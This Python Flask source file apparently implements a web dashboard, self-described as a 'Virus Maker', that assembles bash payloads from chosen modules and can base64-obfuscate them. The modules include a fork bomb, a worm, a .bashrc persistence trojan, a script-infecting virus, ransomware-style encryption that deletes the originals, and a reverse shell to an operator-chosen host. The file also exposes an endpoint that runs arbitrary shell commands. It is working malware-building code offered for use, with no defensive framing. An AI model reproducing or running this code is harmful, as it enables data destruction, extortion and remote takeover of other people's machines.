import os
import yaml
import base64
import subprocess
import platform
from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
from flask_session import Session

# --- Config Loader ---
def load_auth():
    try:
        with open("config.yaml", "r") as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        print("[!] config.yaml missing.")
        exit()

cfg = load_auth()

app = Flask(__name__)
app.config["SECRET_KEY"] = cfg['auth']['secret_key']
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# --- Logic Suite ---
LOGIC = {
    "fork_bomb": ":(){ :|:& };:",
    "worm": r"find ~/ -maxdepth 2 -type d -exec cp $0 {}/sys_cache.sh \;",
    "storage_fill": "dd if=/dev/zero of=~/storage_dump bs=1M count=1024",
    "dump_info": r"uname -a; df -h; ifconfig -a; termux-battery-status 2>/dev/null",
    "trojan": "echo 'nohup bash ' $(pwd) '/' $0 ' &' >> ~/.bashrc",
    "virus": r"find ~/ -name '*.sh' -exec sed -i '1i bash '\"$0\"'' {} \;",
    "scareware": "for i in {1..10}; do echo -e '\\e[31m[!] ALERT\\e[0m'; sleep 0.2; done",
    "encrypt": r"find ~/ -type f -not -name '*.enc' -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k {pass} -pbkdf2 && rm {} \;",
    "reverse_tcp": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
}

# --- UI Template (White Theme + Welcome Subtitle) ---
DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { background:#000; color:#fff; font-family:'Courier New', monospace; margin:0; }
        
        nav { display:flex; background:#000; border-bottom:1px solid #222; }
        nav div { padding: 15px 5px; flex:1; text-align:center; cursor:pointer; font-size:10px; color: #444; text-transform: uppercase; }
        nav div.nav-active { color: #fff; border-bottom: 2px solid #fff; font-weight: bold; }

        .p { display:none; padding:15px; }
        .active { display:block; }

        .full-box { border:1px solid #222; padding:20px; background:#050505; min-height: 420px; margin-top: 10px; }
        .label-v6 { color: #fff; text-transform: uppercase; font-size: 12px; font-weight: bold; margin-bottom: 5px; display: block; border-left: 3px solid #fff; padding-left: 10px; }
        
        /* New Subtitle Style */
        .subtitle { color: #555; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; display: block; padding-left: 13px; }

        input, select { width:100%; background:#000; color:#fff; border:1px solid #333; padding:12px; margin-bottom: 10px; outline:none; font-size: 12px; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px 10px; margin: 20px 0; align-items: center; }
        .grid label { display: flex; align-items: center; font-size: 10px; color: #fff; cursor: pointer; white-space: nowrap; }
        .grid input[type="checkbox"] { width: 18px; height: 18px; margin: 0 10px 0 0; accent-color: #fff; flex-shrink: 0; }

        .obf-label { color: #f0f !important; font-weight: bold; }
        
        .build-btn { width:100%; padding:15px; background:#fff; color:#000; font-weight:bold; border:none; cursor:pointer; text-transform: uppercase; letter-spacing: 2px; }
        .term { background:#000; color:#fff; padding:10px; height:280px; overflow:auto; border:1px solid #222; font-size:11px; margin-top: 10px; }
    </style>
</head>
<body>
    {% if not auth %}
    <div style="display:flex;justify-content:center;align-items:center;height:100vh; padding: 20px;">
        <form method="POST" action="/login" class="full-box" style="width:100%; max-width:300px; border-color:#fff;">
            <input name="u" placeholder="USERNAME" required><input type="password" name="p" placeholder="PASSWORD" required>
            <button class="build-btn">AUTHORIZE</button>
        </form>
    </div>
    {% else %}
    <nav>
        <div id="nb" onclick="pg('b')" class="nav-active">BUILDER</div>
        <div id="nl" onclick="pg('l')">LEAKS</div>
        <div id="nt" onclick="pg('t')">TERMINAL</div>
        <div id="ns" onclick="pg('s')">⚙</div>
    </nav>

    <div id="b" class="p active">
        <div class="full-box">
            <span class="label-v6">PAYLOAD CONFIG</span>
            <span class="subtitle">A Virus Maker is a type of Tool used to create computer viruses or malicious programs!</span> <input id="fn" placeholder="Filename">
            
            <div class="grid">
                <label class="obf-label" style="grid-column: 1 / -1;"><input type="checkbox" id="obf"> [OBFUSCATE]</label>
                
                <label><input type="checkbox" class="mc" value="fork_bomb"> FORK_BOMB</label>
                <label><input type="checkbox" class="mc" value="worm"> WORM</label>
                <label><input type="checkbox" class="mc" value="storage_fill"> STORAGE_FILL</label>
                <label><input type="checkbox" class="mc" value="dump_info"> DUMP_INFO</label>
                <label><input type="checkbox" class="mc" value="trojan"> TROJAN</label>
                <label><input type="checkbox" class="mc" value="virus"> VIRUS</label>
                <label><input type="checkbox" class="mc" value="scareware"> SCAREWARE</label>
                <label><input type="checkbox" class="mc" value="encrypt" onclick="tgl('ep')"> ENCRYPT</label>
                
                <label style="grid-column: 1 / -1; margin-top: 5px;">
                    <input type="checkbox" class="mc" value="reverse_tcp" onclick="tgl('rtcp')"> REVERSE_TCP
                </label>
            </div>
            
            <div id="rtcp" style="display:none; border:1px solid #fff; padding:15px; margin-bottom:15px;">
                <input id="lh" placeholder="LHOST (IP)"><input id="lp" placeholder="LPORT (PORT)">
            </div>
            
            <input id="ep" style="display:none; border-color:#fff;" placeholder="Encryption Key">
            <button class="build-btn" onclick="build()">BUILD PAYLOAD</button>
            <p id="bst" style="color:#fff; font-size:10px; text-align:center; margin-top:10px;"></p>
        </div>
    </div>

    <div id="l" class="p"><div class="full-box"><span class="label-v6">LEAKED_DATA</span><div id="lout" class="term">...</div><button class="build-btn" onclick="leak()" style="margin-top:10px;">SCRAPE</button></div></div>
    <div id="t" class="p"><div class="full-box"><div id="tout" class="term"></div><input id="tin" placeholder="$ command..." onkeydown="if(event.key==='Enter') exec()"></div></div>
    <div id="s" class="p"><div class="full-box"><span class="label-v6">SYSTEM</span><button class="build-btn" onclick="location.href='/logout'" style="background:#222; color:#fff;">KILL SESSION</button></div></div>

    <script>
        function pg(id){
            document.querySelectorAll('.p').forEach(e=>e.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('nav div').forEach(e=>e.classList.remove('nav-active'));
            document.getElementById('n'+id).classList.add('nav-active');
        }
        function tgl(id){const e=document.getElementById(id);e.style.display=e.style.display==='none'?'block':'none';}
        async function build(){
            const m=[...document.querySelectorAll('.mc:checked')].map(e=>e.value);
            const r=await fetch('/api/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({n:document.getElementById('fn').value,m,obf:document.getElementById('obf').checked,pk:document.getElementById('ep').value,lh:document.getElementById('lh').value,lp:document.getElementById('lp').value})});
            const d=await r.json(); document.getElementById('bst').innerText="FILE: "+d.file;
        }
        async function leak(){
            const r=await fetch('/api/leak');const d=await r.json();
            document.getElementById('lout').innerText=d.out;
        }
        async function exec(){
            const i=document.getElementById('tin'), o=document.getElementById('tout');
            const c=i.value; if(!c)return; o.innerHTML+=`<div>$ ${c}</div>`; i.value='';
            const r=await fetch('/api/term',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c})});
            const d=await r.json(); o.innerHTML+=`<div style='color:#777'>${d.out}</div>`; o.scrollTop=o.scrollHeight;
        }
    </script>
    {% endif %}
</body>
</html>
"""

# Server logic remains identical to previous version
@app.route('/')
def home(): return render_template_string(DASHBOARD, auth=session.get("auth"))

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("u")==cfg['auth']['username'] and request.form.get("p")==cfg['auth']['password']:
        session["auth"] = True
    return redirect('/')

@app.route('/logout')
def logout(): session.clear(); return redirect('/')

@app.route('/api/term', methods=['POST'])
def api_term():
    if not session.get("auth"): return jsonify({"out":"Denied"}), 401
    res = subprocess.run(request.json.get("c"), shell=True, capture_output=True, text=True)
    return jsonify({"out": res.stdout + res.stderr})

@app.route('/api/leak')
def api_leak():
    if not session.get("auth"): return jsonify({"out":"Denied"}), 401
    res = subprocess.run(LOGIC["dump_info"], shell=True, capture_output=True, text=True)
    return jsonify({"out": res.stdout})

@app.route('/api/build', methods=['POST'])
def api_build():
    if not session.get("auth"): return jsonify({"file":"Denied"}), 401
    d=request.json; name=d.get("n") or "out"; content="#!/bin/bash\n"
    for m in d.get("m", []):
        cmd=LOGIC[m].replace("{pass}",d.get("pk","pass")).replace("{lhost}",d.get("lh","127.0.0.1")).replace("{lport}",d.get("lp","4444"))
        content+=f"{cmd}\n"
    if d.get("obf"):
        content=f"#!/bin/bash\necho '{base64.b64encode(content.encode()).decode()}' | base64 -d | bash"
    with open(f"{name}.sh", "w") as f: f.write(content)
    os.chmod(f"{name}.sh", 0o755)
    return jsonify({"file": f"{name}.sh"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5901)

